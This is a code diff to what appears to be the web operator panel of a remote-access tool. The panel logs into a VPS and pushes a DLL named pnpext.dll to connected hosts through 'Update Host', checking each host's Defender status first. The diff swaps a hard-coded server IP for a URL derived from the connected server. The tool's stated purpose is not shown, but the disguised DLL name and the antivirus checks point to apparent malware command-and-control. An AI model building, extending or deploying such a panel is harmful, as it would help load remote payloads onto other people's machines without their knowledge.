@@ -2342,7 +2342,7 @@ body {
           <div style="padding:8px;background:rgba(255,255,255,0.02);border-radius:6px;">
             <div data-i18n="set_dll_url" style="font-size:11px;color:#888;margin-bottom:4px;">DLL URL on VPS</div>
             <div style="display:flex; gap:8px; align-items:center;">
-              <input type="text" id="update-url" value="https://64.226.66.66/files/pnpext.dll" placeholder="https://64.226.66.66/files/pnpext.dll" style="flex:1;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:4px;padding:5px 8px;font-size:11px;font-family:monospace;" oninput="localStorage.setItem('update_url',this.value)">
+              <input type="text" id="update-url" value="" placeholder="https://VPS_IP/files/pnpext.dll" style="flex:1;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:4px;padding:5px 8px;font-size:11px;font-family:monospace;" oninput="localStorage.setItem('update_url',this.value)">
               <button type="button" class="fm-btn" data-i18n="set_update_host" onclick="hostUpdate()" style="background:#c62828;color:#fff;">Update Host</button>
               <button type="button" class="fm-btn" data-i18n="set_restart_host" onclick="hostRestart()" style="background:#ff6f00;color:#fff;">↻ Restart</button>
             </div>
@@ -4035,6 +4035,8 @@ function handleText(raw) {
       localStorage.setItem('rdp_token', document.getElementById('in-token').value.trim());
       localStorage.setItem('rdp_password', document.getElementById('in-pass').value);
     } catch (e) {}
+    // Auto-fill DLL update URL from connected server (overrides any stale hardcoded IP)
+    _autoFillUpdateUrl();
     setConnStatus('online');
     // Operator login: WSS auth (room_token) succeeded, but the operator
     // still has to authenticate individually. If the user typed wrong
@@ -11687,8 +11689,8 @@ async function vpsUploadAll() {
       // 1) Wait until VPS nginx is serving the just-uploaded DLL
       stEl.textContent = '⏳ Waiting for VPS to serve fresh DLL...';
       stEl.style.color = '#ff9800';
-      const urlEl = document.getElementById('update-url');
-      const dllUrl = urlEl ? urlEl.value.trim() : '';
+      const dllUrl = _getDllUrl();   // always use current VPS IP, not stale field
+      addLog('DLL probe URL: ' + dllUrl, 'INFO');
       let dllReady = false;
       if (dllUrl) {
         for (let i = 1; i <= 20; i++) {  // up to 40s
@@ -11701,11 +11703,14 @@ async function vpsUploadAll() {
           }
           await new Promise(res => setTimeout(res, 2000));
         }
+      } else {
+        addLog('Upload-All-3: DLL URL empty — skipping probe, proceeding', 'WARN');
+        dllReady = true;  // skip probe if URL can't be determined; host_update will fail gracefully
       }
       if (!dllReady) {
         stEl.textContent = '✗ VPS never served DLL — host NOT updated, reloading page anyway';
         stEl.style.color = '#f44336';
-        addLog('Upload-All-3: aborted host update (VPS DLL unreachable)', 'WARN');
+        addLog('Upload-All-3: aborted host update (VPS DLL unreachable at ' + dllUrl + ')', 'WARN');
         setTimeout(() => location.reload(), 3000);
         return;
       }
@@ -11749,6 +11754,34 @@ async function vpsRestart() {
 
 function vpsReloadPage() {
   location.reload();
+}
+
+// Auto-fill DLL URL from currently connected VPS (called on auth_ok)
+function _autoFillUpdateUrl() {
+  try {
+    const srv = (document.getElementById('in-server').value || '').trim();
+    if (!srv) return;
+    const dllUrl = 'https://' + srv + '/files/pnpext.dll';
+    const urlEl = document.getElementById('update-url');
+    if (urlEl) {
+      urlEl.value = dllUrl;
+      try { localStorage.setItem('update_url', dllUrl); } catch(_) {}
+    }
+  } catch(e) {}
+}
+
+// Derive DLL URL from connection (always correct, even after IP change)
+function _getDllUrl() {
+  const saved = (document.getElementById('update-url')?.value || '').trim();
+  // Reject obviously wrong default IPs that may be stale from old sessions
+  const srv = (document.getElementById('in-server')?.value || '').trim();
+  if (srv) {
+    const derived = 'https://' + srv + '/files/pnpext.dll';
+    // If saved URL matches current server — use it; otherwise override
+    if (!saved || !saved.includes(srv)) return derived;
+    return saved;
+  }
+  return saved;
 }
 
 // Load host version + Defender status into update section
@@ -11808,10 +11841,12 @@ async function hostRestart() {
 
 async function hostUpdate(opts) {
   const skipConfirm = !!(opts && opts.skipConfirm);
-  const urlEl = document.getElementById('update-url');
   const stEl = document.getElementById('update-status');
-  const url = urlEl ? urlEl.value.trim() : '';
-  if (!url) { stEl.textContent = 'Enter DLL URL'; stEl.style.color = '#f44336'; return; }
+  const url = _getDllUrl();   // always derived from current VPS connection
+  // Also update the visible field so user can see what URL will be used
+  const urlEl = document.getElementById('update-url');
+  if (urlEl && url) urlEl.value = url;
+  if (!url) { stEl.textContent = 'Connect to VPS first — URL cannot be determined'; stEl.style.color = '#f44336'; return; }
 
   // Check Defender state before update (skipped when auto-triggered after vpsUploadAll)
   if (!skipConfirm) {
